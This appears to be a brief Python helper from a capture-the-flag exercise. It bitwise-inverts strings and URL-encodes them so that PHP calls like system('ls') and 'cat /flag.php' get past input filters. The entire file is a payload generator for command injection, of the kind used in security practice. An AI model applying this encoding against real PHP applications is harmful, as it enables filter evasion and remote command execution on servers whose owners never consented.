def ones_complement_code(txt):
	a = ['%{:X}'.format(0xff-ord(a)) for a in txt]
	a = ''.join(a)
	print(a)

ones_complement_code("(system)('ls")
ones_complement_code("(system)('cat /flag.php')")
# %9C%9E%8B